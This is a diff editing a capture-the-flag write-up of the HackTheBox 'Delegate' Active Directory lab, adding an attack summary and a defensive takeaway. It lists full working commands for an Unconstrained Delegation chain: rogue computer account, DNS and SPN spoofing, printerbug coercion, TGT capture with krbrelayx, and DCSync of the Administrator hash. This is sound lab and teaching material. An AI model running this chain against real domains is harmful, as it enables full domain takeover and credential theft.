@@ -445,13 +445,13 @@ SeChangeNotifyPrivilege       Bypass traverse checking                          
 SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set    
 ```
-The standout here is **`SeEnableDelegationPrivilege`**. This is a rare and powerful right — it lets the holder configure delegation settings on computer and user accounts in Active Directory. In practice, very few accounts should ever have this privilege, so seeing it on a regular looking user account is a strong signal that the box wants you to abuse delegation.
+The standout here is **`SeEnableDelegationPrivilege`**. This is a rare and powerful right. It lets the holder configure delegation settings on computer and user accounts in Active Directory. In practice, very few accounts should ever have this privilege, so seeing it on a regular looking user account is a strong signal that the box wants you to abuse delegation.
 
-BloodHound confirms this: `N.Thompson` belongs to a group called **"Delegation Admin,"** which explains why this privilege was granted in the first place — likely a misconfigured "helper" group that was given far more power than intended.
+BloodHound confirms this: `N.Thompson` belongs to a group called **"Delegation Admin,"** which explains why this privilege was granted in the first place. Likely a misconfigured "helper" group that was given far more power than intended.
 
 ![BloodHound showing N.Thompson's group membership and privileges](/images/delegate/N.ThompsonBHData.png)
 
-Querying AD for any existing computers trusted for delegation turns up the Domain Controller itself (`DC1`), flagged with `TRUSTED_FOR_DELEGATION`. That attribute is the fingerprint of **Unconstrained Delegation** — when a service configured this way receives a Kerberos ticket from a user, it's handed a *copy of that user's full TGT*, which it can then reuse to authenticate as that user to *any* other service. If you can get a high-privilege account (like a Domain Controller) to authenticate to a machine you control, you walk away with its TGT and effectively become that machine.
+Querying AD for any existing computers trusted for delegation turns up the Domain Controller itself (`DC1`), flagged with `TRUSTED_FOR_DELEGATION`. That attribute is the fingerprint of **Unconstrained Delegation**. When a service configured this way receives a Kerberos ticket from a user, it's handed a *copy of that user's full TGT*, which it can then reuse to authenticate as that user to *any* other service. If you can get a high privilege account (like a Domain Controller) to authenticate to a machine you control, you walk away with its TGT and effectively become that machine.
 
 ```shell
 *Evil-WinRM* PS C:\Users\N.Thompson\Documents> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
@@ -468,14 +468,31 @@ SID               : S-1-5-21-1484473093-3449528695-2030935120-1000
 UserPrincipalName :
 ```
 
-`TRUSTED_FOR_DELEGATION` this Key Attribute tells me it's going to be an Unconstrained Delegation attack.
+So the `TRUSTED_FOR_DELEGATION` Key Attribute tells me it's going to be an Unconstrained Delegation attack.
 
 ### Unconstrained Delegation
 
-#### The Attack Chain
+TL;DR — Attack Path Overview
+
+The Delegate box hinges on a classic but devastating Active Directory misconfiguration: a low-privileged user is granted the extended right SeEnableDelegationPrivilege normally reserved for domain administrators through membership in a custom "Delegation Admin" group. This single oversight opens the door to full domain compromise via an Unconstrained Delegation attack.
+
+The high-level chain looks like this:
+
+1. Enumerate → discover N.Thompson holds SeEnableDelegationPrivilege and that the Domain Controller is configured with TRUSTED_FOR_DELEGATION.
+2. Abuse the Machine Account Quota → create a rogue computer account (evil$) that the attacker fully controls.
+3. Weaponize the privilege → flag the rogue computer as trusted for unconstrained delegation something a normal user should never be able to do.
+4. Fake legitimacy → register a DNS record and SPN so evil$ looks like a real, reachable service on the domain.
+5. Coerce authentication → use the Print Spooler bug (printerbug.py) to force the Domain Controller to authenticate to the attacker's fake machine.
+6. Capture the TGT → because the fake machine is trusted for delegation, the DC's full Kerberos TGT is handed over and captured with krbrelayx.
+7. Dump domain secrets → use the stolen DC machine account TGT to perform a DCSync and extract the Administrator's NTLM hash.
+8. Game over → authenticate as delegate\administrator via Evil-WinRM.
+
+**Root cause in one sentence:** a user was given the power to configure delegation, the domain allowed arbitrary new computer accounts, and nothing coerced the DC into revealing its TGT to a bad actor until this chain was pulled together.
+
+#### The Attack Path
 
 **1. Check the Machine Account Quota (MAQ).**
-By default, any authenticated domain user can add up to 10 computer accounts to the domain. Using NetExec's `maq` module confirms this quota is available — which is what makes the next step possible without needing elevated rights.
+By default, any authenticated domain user can add up to 10 computer accounts to the domain. Using NetExec's `maq` module confirms this quota is available which is what makes the next step possible without needing elevated rights.
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
@@ -487,7 +504,7 @@ MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
 ```
 
 **2. Create a fake computer account.**
-Using `impacket-addcomputer`, a new machine account (`evil$`) is registered in the domain. This gives you a computer object you fully control — including its credentials.
+Using `impacket-addcomputer`, a new machine account `evil$` is registered in the domain. This gives me a computer object I fully control including its credentials.
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
@@ -498,16 +515,16 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 **3. Make the fake computer "trusted for delegation."**
-Because `N.Thompson` holds `SeEnableDelegationPrivilege`, they can flip the `TRUSTED_FOR_DELEGATION` flag on the new `evil$` account (shown here two ways — via `bloodyAD` or the native `ActiveDirectory` PowerShell module). This is the core abuse of the misconfigured privilege: a normal user is turning their own rogue machine into a valid unconstrained-delegation target.
+Because `N.Thompson` holds `SeEnableDelegationPrivilege`, they can flip the `TRUSTED_FOR_DELEGATION` flag on the new `evil$` account (shown here two ways via `bloodyAD` or the native `ActiveDirectory` PowerShell module). This is the core abuse of the misconfigured privilege: a normal user is turning their own rogue machine into a valid unconstrained delegation target.
 
-bloodyAD
+**bloodyAD**
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
 └─❯ bloodyAD --host 10.129.234.69 -u N.Thompson -p KALEB_2341 -d delegate.vl add uac -f TRUSTED_FOR_DELEGATION evil$
 [+] ['TRUSTED_FOR_DELEGATION'] property flags added to evil$'s userAccountControl
 ```
 
-ActiveDirectory Powershell Module
+**ActiveDirectory Powershell Module**
 ```powershell
 *Evil-WinRM* PS C:\Users\N.Thompson\Documents> Set-ADAccountControl -Identity evil$ -TrustedForDelegation $true
 *Evil-WinRM* PS C:\Users\N.Thompson\Documents> Get-ADComputer -Identity evil$ -Properties TrustedForDelegation
@@ -526,7 +543,7 @@ UserPrincipalName    :
 ```
 
 **4. Create a DNS record and SPN for the fake host.**
-`dnstool.py` registers a DNS A record pointing `evil.delegate.vl` at the attacker's IP, and `addspn.py` assigns it a `cifs/` Service Principal Name on the `evil$` computer object. Together, these make `evil.delegate.vl` look like a legitimate, addressable service in the domain — necessary for the DC to be coaxed into authenticating to it.
+`dnstool.py` registers a DNS A record pointing `evil.delegate.vl` at the attacker's IP, and `addspn.py` assigns it a `cifs/` Service Principal Name on the `evil$` computer object. Together, these make `evil.delegate.vl` look like a legitimate, addressable service in the domain necessary for the DC to be coaxed into authenticating to it.
 ```shell
 ┌─[split@parrot:~/Tools/krbrelayx]
 └─❯ python3 dnstool.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -r evil.delegate.vl -a add -t A -d 10.10.14.239 -dns-ip 10.129.234.69 DC1.delegate.vl                        ──(Tue,May26)─┘
@@ -537,7 +554,7 @@ UserPrincipalName    :
 [+] LDAP operation completed successfully
 ```
 
-Craft SPN on the Target Computer
+Crafting an SPN on the Target Computer
 ```shell
 ┌─[split@parrot:~/Tools/krbrelayx]
 └─❯ python3 addspn.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -s 'cifs/evil.delegate.vl' -t evil$ -dc-ip 10.129.234.69 DC1.delegate.vl --additional                     1 ↵ ──(Tue,May26)─┘
@@ -559,9 +576,9 @@ Craft SPN on the Target Computer
 ```
 
 **5. Coerce authentication from the DC.**
-This is the classic one-two punch:
+This is the classic one two punch:
    - **`krbrelayx.py`** is stood up as a listener, ready to capture incoming Kerberos tickets.
-   - **`printerbug.py`** abuses the MS-RPRN (Print Spooler) protocol to force the Domain Controller to authenticate back to the attacker-controlled `evil.delegate.vl`.
+   - **`printerbug.py`** abuses the MS-RPRN (Print Spooler) protocol to force the Domain Controller to authenticate back to the attacker controlled `evil.delegate.vl`.
 
 Because `evil$` is trusted for unconstrained delegation, when DC1 authenticates to it, it hands over a full copy of its own TGT (`DC1$@DELEGATE.VL`). `krbrelayx` captures this ticket.
 
@@ -578,7 +595,7 @@ Because `evil$` is trusted for unconstrained delegation, when DC1 authenticates 
 ![krbrelayx capturing the DC's TGT via the printer bug](/images/delegate/Exploit.png)
 
 **6. Use the captured TGT to dump domain secrets.**
-With the Domain Controller's own TGT in hand (loaded via `KRB5CCNAME`), `impacket-secretsdump` performs a DCSync-style extraction of the Administrator's NTLM hash directly from NTDS.DIT.
+With the Domain Controller's own TGT in hand (loaded via `KRB5CCNAME`), `impacket-secretsdump` performs a DCSync style extraction of the Administrator's NTLM hash directly from NTDS.DIT.
 
 ```shell
 ┌─[split@parrot:~/Tools/krbrelayx]
@@ -594,7 +611,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3e
 ```
 
 **7. Profit.**
-That hash is used to `evil-winrm` straight in as `delegate\administrator` — full domain compromise.
+That hash is used to `evil-winrm` straight in as `delegate\administrator` achieving full domain compromise.
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
@@ -611,3 +628,4 @@ Info: Establishing connection to remote endpoint
 delegate\administrator
 ```
 
+**Defensive takeaway:** audit who holds SeEnableDelegationPrivilege, keep ms-DS-MachineAccountQuota at 0 unless explicitly needed, and disable unconstrained delegation wherever constrained or resource based constrained delegation (RBCD) will do instead.
